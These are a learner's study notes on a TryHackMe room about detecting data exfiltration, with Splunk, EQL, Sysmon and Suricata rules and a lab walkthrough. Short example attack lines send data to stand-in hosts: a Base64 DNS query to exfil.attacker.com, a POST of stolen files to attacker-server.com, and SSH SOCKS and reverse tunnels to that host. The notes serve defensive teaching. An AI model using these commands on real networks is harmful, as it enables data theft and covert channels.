# Data Exfiltration Detection - TryHackMe Room Notes

**Room:** Data Exfiltration Detection  
**URL:** https://tryhackme.com/room/dataexfildetection  
**Difficulty:** Medium  
**Category:** SOC, Blue Team, Detection Engineering

---

## 📋 Table of Contents

1. [Task 1: Introduction](#task-1-introduction)
2. [Task 2: What is Data Exfiltration?](#task-2-what-is-data-exfiltration)
3. [Task 3: Common Exfiltration Techniques](#task-3-common-exfiltration-techniques)
4. [Task 4: Network-Based Detection](#task-4-network-based-detection)
5. [Task 5: Host-Based Detection](#task-5-host-based-detection)
6. [Task 6: DNS Tunneling Detection](#task-6-dns-tunneling-detection)
7. [Task 7: HTTP/HTTPS Exfiltration](#task-7-httphttps-exfiltration)
8. [Task 8: Detecting Encrypted Channels](#task-8-detecting-encrypted-channels)
9. [Task 9: SIEM Rules and Alerts](#task-9-siem-rules-and-alerts)
10. [Task 10: Practical Detection Lab](#task-10-practical-detection-lab)
11. [Key Takeaways](#key-takeaways)
12. [Detection Rules Summary](#detection-rules-summary)

---

## Task 1: Introduction

### Overview
Data exfiltration is one of the final stages in the cyber kill chain where attackers extract valuable data from compromised systems. As a SOC analyst or detection engineer, identifying data exfiltration attempts is critical to preventing data breaches.

### Learning Objectives
- Understand various data exfiltration techniques used by threat actors
- Learn network and host-based indicators of data exfiltration
- Develop detection rules for common exfiltration methods
- Practice analyzing logs and network traffic for suspicious patterns
- Implement SIEM rules for automated detection

### Prerequisites
- Basic understanding of network protocols (TCP/IP, DNS, HTTP/HTTPS)
- Familiarity with SIEM platforms (Splunk, Elastic, etc.)
- Knowledge of Windows and Linux system logs
- Understanding of packet analysis tools (Wireshark, tcpdump)

---

## Task 2: What is Data Exfiltration?

### Definition
**Data Exfiltration** is the unauthorized transfer of data from a computer or network. It's also known as data theft, data leakage, or information exfiltration.

### Why Attackers Exfiltrate Data
- **Financial gain**: Selling stolen credentials, PII, or intellectual property
- **Espionage**: State-sponsored actors stealing sensitive information
- **Ransomware**: Exfiltrating data before encryption for double extortion
- **Competitive advantage**: Stealing trade secrets or business plans
- **Identity theft**: Harvesting personal information for fraud

### Common Targets
- **Personally Identifiable Information (PII)**: Names, SSNs, addresses, phone numbers
- **Financial Data**: Credit cards, bank accounts, payment information
- **Intellectual Property (IP)**: Source code, patents, research data
- **Credentials**: Usernames, passwords, API keys, certificates
- **Business Data**: Customer lists, contracts, strategic plans
- **Healthcare Records**: Medical history, insurance information (PHI/HIPAA)

### Exfiltration Lifecycle
1. **Initial Access**: Compromise via phishing, exploits, or insider threats
2. **Privilege Escalation**: Gain higher access levels
3. **Discovery**: Identify valuable data locations
4. **Collection**: Gather and stage data for extraction
5. **Exfiltration**: Transfer data out of the network
6. **Covering Tracks**: Remove logs and evidence

---

## Task 3: Common Exfiltration Techniques

### 1. DNS Tunneling
**How it works**: Encodes data within DNS queries and responses
- Queries sent to attacker-controlled DNS servers
- Data embedded in subdomain names or TXT records
- Appears as normal DNS traffic

**Example DNS Query**:
```
dGVzdGRhdGE=.exfil.attacker.com
```

**Detection Indicators**:
- Unusually long subdomain names (>50 characters)
- High volume of DNS queries to single domain
- DNS queries containing Base64 or hex-encoded data
- Queries to newly registered or suspicious domains
- Abnormal TXT record requests

### 2. HTTP/HTTPS POST Requests
**How it works**: Upload data to external web servers
- POST requests to pastebin-like services
- Legitimate services abused (GitHub, Dropbox, Google Drive)
- Custom Command & Control (C2) servers

**Detection Indicators**:
- Large outbound POST requests to external IPs
- Uploads to file-sharing services outside work hours
- POST requests with suspicious User-Agents
- Connections to known malicious IPs/domains
- Unusual upload volumes from endpoints

### 3. Email Exfiltration
**How it works**: Attach or embed data in email messages
- Sending to personal email accounts
- Auto-forwarding rules to external addresses
- Webmail services accessed from compromised systems

**Detection Indicators**:
- Large email attachments sent externally
- Email forwarding rules created by users
- High volume of emails to external domains
- Emails sent outside business hours
- Access to webmail from unusual IPs

### 4. Cloud Storage Services
**How it works**: Upload to cloud platforms
- Dropbox, Google Drive, OneDrive, Box, AWS S3
- Often legitimate services, hard to block entirely

**Detection Indicators**:
- Unusual upload volumes to cloud services
- First-time use of cloud services by an account
- Data uploads from servers (not typical user endpoints)
- Access to cloud APIs with stolen credentials

### 5. FTP/SFTP Transfers
**How it works**: File transfers to external FTP servers
- Direct file uploads over FTP/SFTP
- Anonymous FTP servers used as staging

**Detection Indicators**:
- FTP connections to external/unknown servers
- Large file transfers over port 21/22 to external IPs
- FTP traffic from servers or non-standard endpoints

### 6. Steganography
**How it works**: Hide data within images, audio, or video files
- Legitimate-looking media files with embedded data
- Often combined with other exfiltration methods

**Detection Indicators**:
- Unusual file sizes for image/media types
- High entropy in image file sections
- Repeated uploads of similar media files

### 7. Physical Media
**How it works**: Copy data to USB drives, external HDDs, CDs
- Insider threats commonly use this method
- Difficult to detect without endpoint monitoring

**Detection Indicators**:
- USB device connection logs
- Large file copies to removable media
- File access to sensitive directories before USB insertion

### 8. Encrypted Tunnels (VPN, SSH, TOR)
**How it works**: Establish encrypted channels out of network
- SSH tunnels to external servers
- VPN connections to attacker infrastructure
- TOR network for anonymity

**Detection Indicators**:
- Unexpected SSH connections to external IPs
- Unauthorized VPN usage
- TOR traffic detected
- Encrypted traffic to unusual destinations

---

## Task 4: Network-Based Detection

### Key Network Indicators

#### 1. **Abnormal Data Volume**
- Sudden spike in outbound traffic
- Large data transfers outside business hours
- Consistent high-volume transfers to single destination

**Detection Query (Zeek/Bro)**:
```
conn.log | where orig_bytes > 10485760 (>10MB)
```

#### 2. **Unusual Protocols**
- Protocols not typically used in the environment
- DNS over non-standard ports
- HTTP on unusual ports (8080, 8888)

**Wireshark Filter**:
```
dns.qry.name.len > 50 and not dns.flags.response
```

#### 3. **Beaconing Behavior**
- Regular, periodic connections (C2 beaconing)
- Consistent timing intervals
- Same packet sizes repeatedly

**Detection**: Use frequency analysis on connection logs

#### 4. **Geographical Anomalies**
- Connections to countries not part of business operations
- Newly registered domains in suspicious TLDs
- IP addresses with poor reputation scores

### Network Monitoring Tools
- **Wireshark**: Packet capture and analysis
- **Zeek (Bro)**: Network security monitor
- **Suricata**: IDS/IPS with threat detection
- **tcpdump**: Command-line packet analyzer
- **ntop/ntopng**: Network traffic analysis
- **NetFlow/sFlow**: Flow-based monitoring

### Detection Strategies
1. **Baseline Normal Traffic**: Understand typical network patterns
2. **Monitor Outbound Traffic**: Focus on data leaving the network
3. **Protocol Analysis**: Deep packet inspection for anomalies
4. **Reputation Checks**: Verify destinations against threat intel
5. **SSL/TLS Inspection**: Decrypt and inspect encrypted traffic (with proper policy)

---

## Task 5: Host-Based Detection

### Endpoint Indicators

#### 1. **File Access Patterns**
- Unusual access to sensitive directories
- Mass file reads (ransomware/staging behavior)
- Compression of multiple files (archiving before exfil)

**Windows Event Logs to Monitor**:
- Event ID 4663: Object access auditing
- Event ID 4656: Handle to an object was requested
- Event ID 5145: Network share object accessed

#### 2. **Process Behavior**
- Unusual processes making network connections
- Processes accessing multiple files rapidly
- PowerShell/cmd.exe making external connections
- Compression utilities (7zip, WinRAR) executed

**Sysmon Event IDs**:
- Event ID 1: Process Creation
- Event ID 3: Network Connection
- Event ID 11: File Creation
- Event ID 22: DNS Query

#### 3. **Registry Modifications**
- Auto-start persistence mechanisms
- Browser extensions added
- Proxy settings modified

**Key Registry Paths**:
```
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
```

#### 4. **User Behavior**
- Off-hours activity
- Access to systems/data outside role
- Privilege escalation attempts
- Multiple failed login attempts followed by success

### Host-Based Security Tools
- **EDR Solutions**: CrowdStrike, SentinelOne, Carbon Black
- **Sysmon**: Enhanced Windows logging
- **OSQuery**: SQL-based endpoint visibility
- **OSSEC/Wazuh**: Host-based intrusion detection
- **auditd**: Linux system auditing

### Detection Rules Example (Sysmon)

**Detect PowerShell Network Connections**:
```xml
<Rule groupRelation="and">
  <ProcessName condition="contains">powershell.exe</ProcessName>
  <NetworkConnection condition="begin">Initiated</NetworkConnection>
  <DestinationIp condition="is not">Internal_Network</DestinationIp>
</Rule>
```

---

## Task 6: DNS Tunneling Detection

### Understanding DNS Tunneling
DNS tunneling exploits DNS protocol to establish covert communication channels. Since DNS is typically allowed through firewalls, it's an attractive exfiltration vector.

### Detection Methods

#### 1. **Query Length Analysis**
Legitimate DNS queries are typically short; tunneled data creates long subdomains.

**Splunk Query**:
```spl
index=dns 
| eval query_length=len(query) 
| where query_length > 50
| stats count by src_ip, query
| where count > 10
```

#### 2. **Query Volume Analysis**
Unusual number of DNS queries to a single domain.

**Detection Logic**:
```
Count DNS queries per source IP per domain
If count > threshold (e.g., 100 queries/minute): ALERT
```

#### 3. **Entropy Analysis**
Random-looking subdomains indicate encoded data.

**High Entropy Indicators**:
- Base64 encoded strings in subdomains
- Hex-encoded data
- Random alphanumeric sequences

**Python Entropy Check**:
```python
import math
from collections import Counter

def calculate_entropy(data):
    if not data:
        return 0
    entropy = 0
    counter = Counter(data)
    length = len(data)
    for count in counter.values():
        p = count / length
        entropy -= p * math.log2(p)
    return entropy

# High entropy (>3.5) suggests encoding
domain = "dGVzdGRhdGE.evil.com"
entropy = calculate_entropy(domain)
```

#### 4. **Subdomain Patterns**
- Multiple levels of subdomains (>3)
- Repeating patterns
- Numeric-only subdomains

#### 5. **Query Type Analysis**
- Excessive TXT record queries
- NULL record requests
- Uncommon record types (CNAME chains)

### DNS Tunneling Tools (Red Team)
- **Iodine**: DNS tunneling tool
- **DNSCat2**: DNS tunnel for command and control
- **dnsexfil**: Simple DNS exfiltration script

### Prevention & Mitigation
- Implement DNS query logging and monitoring
- Use DNS sinkholing for known malicious domains
- Enforce DNSSEC where possible
- Restrict DNS queries to approved resolvers only
- Set up alerts for long DNS queries
- Monitor for newly registered domains (NRDs)

---

## Task 7: HTTP/HTTPS Exfiltration

### HTTP-Based Exfiltration Techniques

#### 1. **POST Request Uploads**
Data sent via HTTP POST to external servers.

**Example POST Request**:
```http
POST /upload.php HTTP/1.1
Host: attacker-server.com
Content-Type: application/octet-stream
Content-Length: 1048576

[Binary data of stolen files]
```

#### 2. **Pastebin Services**
Legitimate services abused for data storage:
- Pastebin.com
- GitHub Gists
- PasteBin alternatives
- Cloud note services

#### 3. **Legitimate Cloud Services**
- Dropbox API
- Google Drive
- OneDrive
- AWS S3 buckets
- Azure Blob Storage

### Detection Strategies

#### 1. **Web Proxy Log Analysis**
**Indicators**:
- Large POST requests
- Uploads to file-sharing services
- Requests to pastebin-like domains

**Splunk Query**:
```spl
index=proxy method=POST
| where bytes_out > 1048576
| stats count, sum(bytes_out) as total_bytes by src_ip, dest_domain
| where total_bytes > 10485760
```

#### 2. **User-Agent Analysis**
Custom or unusual User-Agent strings often indicate automated tools.

**Suspicious User-Agents**:
```
Python-urllib/3.x
curl/7.x
Wget/1.x
Custom-Agent-v1
```

**Detection Query**:
```spl
index=web_proxy
| search user_agent IN ("curl*", "wget*", "python*", "powershell*")
| stats count by src_ip, user_agent, url
```

#### 3. **File Extension Monitoring**
Monitor uploads of sensitive file types:
- `.zip`, `.rar`, `.7z` (compressed archives)
- `.xlsx`, `.docx`, `.pdf` (documents)
- `.sql`, `.bak` (database files)
- `.pst`, `.ost` (email archives)

#### 4. **Frequency and Volume Analysis**
- First-time access to file-sharing services
- Sudden increase in upload traffic
- Uploads outside business hours

### HTTPS Challenges
- Encrypted traffic prevents content inspection
- Requires SSL/TLS interception (with policy considerations)
- Certificate pinning may break inspection
- Privacy and legal considerations

**Alternative Detection Methods**:
- Certificate analysis (subject, issuer)
- TLS fingerprinting (JA3/JA3S)
- Connection metadata (duration, volume, frequency)
- Endpoint behavior correlation

---

## Task 8: Detecting Encrypted Channels

### Encrypted Exfiltration Methods

#### 1. **SSH Tunnels**
Establish encrypted tunnel to external server.

**Command Example**:
```bash
ssh -D 8080 user@attacker-server.com
# Or reverse tunnel
ssh -R 9000:localhost:22 user@attacker-server.com
```

**Detection Indicators**:
- SSH connections to non-standard ports
- SSH to external IPs not in approved list
- High data transfer over SSH connections
- SSH from unexpected source (e.g., workstations, not admins)

**Splunk Query**:
```spl
index=firewall dest_port=22 action=allowed
| where NOT cidrmatch("10.0.0.0/8", dest_ip)
| stats sum(bytes_out) as total_bytes by src_ip, dest_ip
| where total_bytes > 10485760
```

#### 2. **VPN Connections**
Unauthorized VPN clients establishing encrypted tunnels.

**Detection**:
- Monitor for OpenVPN, IPSec, WireGuard traffic
- Alert on VPN connections not from approved servers
- Detect VPN client installation on endpoints

**Network Signatures**:
```
OpenVPN: UDP port 1194
IPSec: UDP ports 500, 4500
WireGuard: UDP port 51820
```

#### 3. **TOR Network**
The Onion Router provides anonymity and encryption.

**Detection Methods**:
- Block known TOR exit nodes (public lists available)
- Detect TOR client signatures
- Monitor for connections to TOR directory servers

**Suricata Rule**:
```
alert tcp any any -> any any (msg:"TOR Connection Detected"; \
content:"|16 03|"; depth:2; content:"|01|"; distance:1; within:1; \
classtype:policy-violation; sid:1000001;)
```

#### 4. **Custom Encryption**
Attackers may implement custom encryption before transfer.

**Detection Challenges**:
- Difficult to identify without content analysis
- Requires behavior-based detection
- Focus on process and network anomalies

### TLS/SSL Inspection

#### When to Use:
- High-security environments
- Compliance requirements
- Suspected data exfiltration incidents

#### Considerations:
- Privacy implications
- Legal requirements
- Performance impact
- Certificate trust issues
- Breaks certificate pinning

#### Implementation:
1. Deploy SSL inspection proxy/firewall
2. Install root CA certificate on endpoints
3. Configure exceptions for sensitive services (banking, healthcare)
4. Monitor and tune to reduce false positives

### Behavioral Detection
When content inspection isn't possible, focus on behavior:
- **Connection patterns**: Frequency, timing, duration
- **Volume analysis**: Bytes transferred over time
- **Endpoint behavior**: Process network activity correlation
- **User context**: Activity outside normal role/hours

---

## Task 9: SIEM Rules and Alerts

### Splunk Detection Rules

#### Rule 1: Large Outbound Data Transfer
```spl
index=firewall action=allowed direction=outbound
| stats sum(bytes_out) as total_bytes by src_ip, dest_ip
| where total_bytes > 104857600  # >100MB
| eval total_mb=round(total_bytes/1048576, 2)
| table src_ip, dest_ip, total_mb
```

#### Rule 2: DNS Tunneling Detection
```spl
index=dns
| eval query_length=len(query)
| where query_length > 50
| stats count, values(query) as queries by src_ip
| where count > 20
| sort -count
```

#### Rule 3: Suspicious PowerShell Network Activity
```spl
index=windows EventCode=3 Image="*powershell.exe"
| search NOT DestinationIp IN ("10.*", "172.16.*", "192.168.*")
| stats count by Computer, DestinationIp, DestinationPort
| where count > 5
```

#### Rule 4: File Access Before Exfiltration
```spl
index=windows (EventCode=4663 OR EventCode=5145)
ObjectType=File
| stats dc(ObjectName) as unique_files by SubjectUserName, Computer
| where unique_files > 50
```

#### Rule 5: Cloud Storage Upload
```spl
index=proxy 
| search (dest_domain="*dropbox.com" OR dest_domain="*drive.google.com" OR dest_domain="*onedrive.com")
method=POST
| stats sum(bytes_out) as total_upload by src_ip, user, dest_domain
| where total_upload > 10485760  # >10MB
```

### Elastic Stack (EQL) Rules

#### Detect SSH to External IP
```eql
network where event.action == "connection" and 
destination.port == 22 and 
not cidrmatch(destination.ip, "10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16")
```

#### Detect Data Staging
```eql
sequence by process.entity_id with maxspan=5m
  [process where event.type == "start" and 
   process.name in ("7z.exe", "winrar.exe", "tar", "zip")]
  [file where event.type == "creation" and 
   file.extension in ("zip", "rar", "7z", "tar.gz")]
  [network where event.type == "connection" and 
   destination.port in (80, 443)]
```

### QRadar Custom Rules

#### High Volume External Transfer
```
when (bytes_sent > 104857600 and destination_ip NOT IN [RFC1918])
from events
group by source_ip, destination_ip
having count(*) > 1
```

### Alert Tuning Best Practices

#### 1. **Baseline Establishment**
- Monitor for 2-4 weeks before enabling alerts
- Understand normal traffic patterns
- Document expected behaviors

#### 2. **Whitelisting**
- Approved cloud services
- Legitimate business file transfers
- Authorized remote access
- Backup systems

#### 3. **Threshold Tuning**
- Start with higher thresholds to reduce noise
- Gradually lower as false positives decrease
- Different thresholds for different user groups

#### 4. **Context Enrichment**
- User department and role
- Asset criticality
- Threat intelligence feeds
- Historical behavior

#### 5. **Alert Fatigue Prevention**
- Consolidate related alerts
- Use severity levels appropriately
- Implement alert throttling
- Regular review and updates

---

## Task 10: Practical Detection Lab

### Lab Scenario
You are a SOC analyst at SecureCorp. Your SIEM has triggered multiple alerts indicating potential data exfiltration. Analyze the provided logs and network captures to determine:
1. What data exfiltration technique was used?
2. What data was exfiltrated?
3. What is the attacker's infrastructure?
4. What detection rule would catch this in the future?

### Investigation Steps

#### Step 1: Initial Triage
1. Review SIEM alert details
2. Identify affected systems and users
3. Check timeline of suspicious activity
4. Gather relevant logs (network, host, authentication)

#### Step 2: Network Traffic Analysis
```bash
# Analyze PCAP file
tcpdump -r capture.pcap -nn 'port 53' | head -50

# Extract DNS queries
tshark -r capture.pcap -Y "dns.qry.name" -T fields -e dns.qry.name | sort | uniq -c

# Find large transfers
tshark -r capture.pcap -z conv,tcp -q
```

#### Step 3: Log Analysis (Splunk/ELK)
```spl
# Find all activity from suspicious IP
index=* src_ip="192.168.1.100" OR dest_ip="192.168.1.100"
| stats count by sourcetype, _time
| sort -_time

# Correlate with file access
index=windows EventCode=4663 Computer="WORKSTATION-01"
| transaction SubjectUserName maxspan=10m
| where eventcount > 50
```

#### Step 4: Endpoint Investigation
```bash
# Check running processes (live response)
Get-Process | Where-Object {$_.Name -like "*powershell*"} | Select-Object Id, ProcessName, StartTime

# Review Sysmon logs
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=3} | 
Where-Object {$_.Properties[14].Value -notmatch "^(10\.|172\.16\.|192\.168\.)"} | 
Select-Object TimeCreated, Message

# Check scheduled tasks
Get-ScheduledTask | Where-Object {$_.State -eq "Ready" -and $_.TaskPath -notlike "\Microsoft\*"}
```

#### Step 5: IOC Extraction
Document indicators of compromise:
- **IP Addresses**: External destinations
- **Domain Names**: C2 servers, exfiltration endpoints
- **File Hashes**: Malicious tools used
- **File Paths**: Staged data locations
- **User Accounts**: Compromised credentials
- **Processes**: Malicious executables

#### Step 6: Containment Recommendations
1. **Network**: Block malicious IPs/domains at firewall
2. **Endpoint**: Isolate affected systems
3. **Accounts**: Reset compromised credentials
4. **Persistence**: Remove malicious scheduled tasks/registry keys

### Common Lab Questions & Answers

**Q1: What encoding was used in the DNS queries?**
- Analyze query patterns
- Decode Base64 or hex strings
- Example: `echo "dGVzdGRhdGE=" | base64 -d`

**Q2: How much data was exfiltrated?**
- Sum up bytes transferred in relevant connections
- Account for encoding overhead (Base64 = 33% increase)

**Q3: What detection rule would prevent this?**
- Write Splunk/Sigma rule based on your findings
- Include threshold, frequency, and field values

**Q4: What MITRE ATT&CK technique is this?**
- **T1048**: Exfiltration Over Alternative Protocol
- **T1041**: Exfiltration Over C2 Channel
- **T1567**: Exfiltration Over Web Service
- **T1071**: Application Layer Protocol

---

## Key Takeaways

### Critical Detection Points
1. ✅ **Monitor outbound traffic** more closely than inbound
2. ✅ **Baseline normal behavior** before implementing alerts
3. ✅ **Focus on anomalies**: unusual volumes, timing, destinations
4. ✅ **Correlate multiple data sources**: network + endpoint + authentication
5. ✅ **Implement layered detection**: network, host, cloud, user behavior
6. ✅ **Tune alerts regularly** to reduce false positives
7. ✅ **Enrich with threat intelligence** for faster triage

### Common Mistakes to Avoid
- ❌ Ignoring encrypted traffic (focus on metadata)
- ❌ Only monitoring inbound threats
- ❌ Setting thresholds too low (alert fatigue)
- ❌ Not considering legitimate business use cases
- ❌ Failing to update detection rules regularly
- ❌ Overlooking insider threats

### MITRE ATT&CK Framework Mapping

**Exfiltration Tactics (TA0010)**:
- **T1020**: Automated Exfiltration
- **T1030**: Data Transfer Size Limits
- **T1048**: Exfiltration Over Alternative Protocol
  - T1048.001: Exfiltration Over Symmetric Encrypted Non-C2 Protocol
  - T1048.002: Exfiltration Over Asymmetric Encrypted Non-C2 Protocol
  - T1048.003: Exfiltration Over Unencrypted Non-C2 Protocol
- **T1041**: Exfiltration Over C2 Channel
- **T1011**: Exfiltration Over Other Network Medium
- **T1052**: Exfiltration Over Physical Medium
- **T1567**: Exfiltration Over Web Service
  - T1567.001: Exfiltration to Code Repository
  - T1567.002: Exfiltration to Cloud Storage

### Essential Tools Summary

**Network Analysis**:
- Wireshark, tcpdump, tshark
- Zeek/Bro, Suricata
- NetFlow/sFlow analyzers

**Endpoint Monitoring**:
- Sysmon, OSQuery
- EDR platforms (CrowdStrike, SentinelOne)
- Windows Event Logs, auditd

**SIEM Platforms**:
- Splunk Enterprise Security
- Elastic Security
- IBM QRadar
- Microsoft Sentinel

**Threat Intelligence**:
- VirusTotal
- AlienVault OTX
- Abuse.ch
- ThreatConnect

---

## Detection Rules Summary

### Quick Reference: Key Detection Signatures

#### Network-Based
```
1. DNS query length > 50 characters
2. DNS query count > 100/min to single domain
3. Outbound transfer > 100MB to single destination
4. SSH to external IP not in approved list
5. HTTP POST > 10MB to external domain
```

#### Host-Based
```
1. File access count > 50 files in 5 minutes
2. PowerShell network connection to external IP
3. Process creating .zip/.rar followed by network activity
4. User accessing data outside normal role
5. Mass file compression before network activity
```

#### User Behavior
```
1. Login from unusual location/IP
2. File access outside business hours
3. First-time use of cloud storage service
4. Privilege escalation followed by file access
5. Email forwarding rule created
```

### Recommended Alert Priority

**CRITICAL** (Immediate Response):
- Active data exfiltration > 1GB
- Known malware/C2 communication
- Privileged account compromise with file access

**HIGH** (Investigate within 1 hour):
- DNS tunneling detected
- Unauthorized cloud storage uploads
- Mass file access by single user

**MEDIUM** (Investigate within 4 hours):
- Suspicious User-Agent strings
- External SSH connections
- Unusual outbound traffic patterns

**LOW** (Review daily):
- Policy violations
- Authorized but unusual activity
- Whitelisted anomalies for trend analysis

---

## Additional Resources

### Further Learning
- **SANS SEC511**: Continuous Monitoring and Security Operations
- **SANS FOR578**: Cyber Threat Intelligence
- **MITRE ATT&CK**: Exfiltration tactics
- **CIS Controls**: Data Protection controls (v8)
- **NIST Cybersecurity Framework**: PR.DS (Data Security)

### Useful Links
- MITRE ATT&CK Exfiltration: https://attack.mitre.org/tactics/TA0010/
- Sigma Rules Repository: https://github.com/SigmaHQ/sigma
- Awesome Detection Engineering: https://github.com/0x4D31/awesome-detection-engineering
- ThreatHunter-Playbook: https://github.com/OTRF/ThreatHunter-Playbook

### Practice Environments
- TryHackMe: SOC Level 1 & 2 paths
- CyberDefenders: Blue Team Labs
- Boss of the SOC (BOTS): Splunk dataset challenges
- Detection Lab: https://github.com/clong/DetectionLab

---

## Conclusion

Data exfiltration detection is a critical skill for SOC analysts and detection engineers. Key success factors include:
- **Comprehensive visibility** across network, endpoint, and cloud
- **Behavioral analytics** to identify anomalies
- **Threat intelligence integration** for context
- **Continuous improvement** of detection rules
- **Balance** between security and usability

Remember: **Prevention is ideal, detection is essential, response is critical.**

---

**Notes Created By**: Fazal Shaik  
**Date**: January 2026  
**Purpose**: TryHackMe Room Completion & Knowledge Reference  
**Room URL**: https://tryhackme.com/room/dataexfildetection

